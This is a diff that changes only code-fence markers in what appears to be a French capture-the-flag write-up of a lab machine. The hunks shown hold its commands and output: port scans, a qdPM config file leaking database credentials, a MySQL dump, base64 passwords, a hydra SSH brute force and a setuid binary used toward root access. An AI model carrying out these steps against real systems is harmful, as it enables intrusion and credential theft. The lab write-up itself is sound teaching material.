@@ -14,7 +14,7 @@ On dispose d'un petit synopsis pour se mettre dans l'ambiance :
 
 Parmi les ports ouverts on trouve un SSH, un serveur web, un mysql et un autre que Nmap devine comme étant probablement du mysqlx (une spécificité récente de mysql, je n'en sait pas plus) :  
 
-```plain
+```
 Nmap scan report for 192.168.2.9
 Host is up (0.00021s latency).
 Not shown: 65531 closed tcp ports (reset)
@@ -56,7 +56,7 @@ PORT      STATE SERVICE VERSION
 
 J'ai aussi lancé *feroxbuster* qui n'a pas remonté grand chose d'intéressant :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.2.9/ -w raft-large-directories.txt -t 10 -n
 
  ___  ___  __   __     __      __         __   ___ 
@@ -102,13 +102,13 @@ En ce rendant sur le site de l'éditeur on découvre qu'il s'agit de la dernièr
 
 [Sur exploit-db](https://www.exploit-db.com/exploits/50176) on trouve une vulnérabilité pour cette version (non patchée donc). Ça craint un peu, sans compter que la vulnérabilité est toute bête :  
 
-```plain
+```
 The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
 ```
 
 Cette vulnérabilité aurait aussi remontée via le scanner [Nuclei](https://nuclei.projectdiscovery.io/) :  
 
-```plain
+```
 $ nuclei -u http://192.168.2.9/
 
                      __     _ 
@@ -152,7 +152,7 @@ $ nuclei -u http://192.168.2.9/
 
 Effectivement on trouve bien un YAML avec un password (seule la chaîne entre double quotes est à prendre en compte) :  
 
-```plain
+```
 all:
   doctrine:
     class: sfDoctrineDatabase
@@ -170,7 +170,7 @@ Step in
 
 Je suis bien évidemment tenté d'accéder au mysql mais j'obtiens une erreur :  
 
-```plain
+```
 $ mysql -u qdpmadmin -h 192.168.2.9 -p qdpm
 Enter password: 
 ERROR 1045 (28000): Plugin caching_sha2_password could not be loaded: /usr/lib64/mysql/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory
@@ -178,7 +178,7 @@ ERROR 1045 (28000): Plugin caching_sha2_password could not be loaded: /usr/lib64
 
 Ce n'est pas mieux sur le port mysqlx :  
 
-```plain
+```
 $ mysql -u qdpmadmin -h 192.168.2.9 -P 33060 -p qdpm
 Enter password: 
 ERROR:
@@ -194,7 +194,7 @@ $ ssh -L 4444:192.168.2.9:3306 devloop@192.168.1.47
 
 Cette fois ça fonctionne :  
 
-```plain
+```
 $ mysql -u qdpmadmin -h 127.0.0.1 -P 4444  -p qdpm
 Enter password:
 Reading table information for completion of table and column names
@@ -234,13 +234,13 @@ $ mysqldump -u qdpmadmin -h 127.0.0.1 -P 4444 -p qdpm > /tmp/qdpm.sql
 
 Il n'y a plus qu'à chercher les occurrences de *INSERT* dans le dump. Celle-ci est intéressante :  
 
-```plain
+```
 INSERT INTO `configuration` VALUES (1,'app_administrator_email','admin@localhost.com'),(2,'app_administrator_password','$P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0'),
 ```
 
 A priori le hash est au format phpass et on peut tenter de le casser de cette manière :  
 
-```plain
+```
 $ john --format=phpass --wordlist=rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
@@ -251,14 +251,14 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 Toutefois ça ne semble mener nul part. Je passe à la base *staff* :  
 
-```plain
+```
 INSERT INTO `login` VALUES (1,2,'c3VSSkFkR3dMcDhkeTNyRg=='),(2,4,'N1p3VjRxdGc0MmNtVVhHWA=='),(3,1,'WDdNUWtQM1cyOWZld0hkQw=='),(4,3,'REpjZVZ5OThXMjhZN3dMZw=='),(5,5,'Y3FObkJXQ0J5UzJEdUpTeQ==');
 INSERT INTO `user` VALUES (1,1,'Smith','Cyber Security Specialist'),(2,2,'Lucas','Computer Engineer'),(3,1,'Travis','Intelligence Specialist'),(4,1,'Dexter','Cyber Security Analyst'),(5,2,'Meyer','Genetic Engineer');
 ```
 
 Je décode les base64, rassemble les noms d'utilisateurs (avec et sans majuscules) dans un fichier, les pass dans un autre et je bruteforce SSH avec ces informations :  
 
-```plain
+```
 $ hydra -L /tmp/users.txt -P /tmp/passwords.txt  ssh://192.168.2.9
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -277,14 +277,14 @@ Step up
 
 On trouve un flag dans le dossier de l'utilisateur Travis :  
 
-```plain
+```
 travis@debian:~$ cat user.txt
 ICA{Secret_Project}
 ```
 
 Mais rien de plus, alors je passe sur l'utilisateur Dexter :  
 
-```plain
+```
 dexter@debian:~$ cat note.txt 
 It seems to me that there is a weakness while accessing the system.
 As far as I know, the contents of executable files are partially viewable.
@@ -293,7 +293,7 @@ I need to find out if there is a vulnerability or not
 
 Je trouve effectivement un binaire setuid dans un dossier inhabituel :  
 
-```plain
+```
 dexter@debian:~$ find / -type f -perm -u+s 2> /dev/null
 /opt/get_access
 /usr/bin/chfn
@@ -311,13 +311,13 @@ dexter@debian:~$ find / -type f -perm -u+s 2> /dev/null
 
 *get\_access* et lisible et setuid root :  
 
-```plain
+```
 -rwsr-xr-x 1 root root 16816 Sep 25 09:25 /opt/get_access
 ```
 
 L'extraction des chaînes de caractère donne une idée de ce que fait le programme :  
 
-```plain
+```
 dexter@debian:~$ strings /opt/get_access
 /lib64/ld-linux-x86-64.so.2
 setuid 
@@ -344,7 +344,7 @@ deregister_tm_clones
 --- snip ---
 ```
 
-```plain
+```
 dexter@debian:~$ ls -l /root/system.info
 ls: cannot access '/root/system.info': Permission denied 
 dexter@debian:~$ /opt/get_access
@@ -377,7 +377,7 @@ All services are disabled. Accessing to the system is allowed only within workin
 
 Plus qu'à récupérer notre accès :  
 
-```plain
+```
 $ ssh root@192.168.2.9
 Enter passphrase for key '/home/sirius/.ssh/id_rsa':
 root@debian:~# id
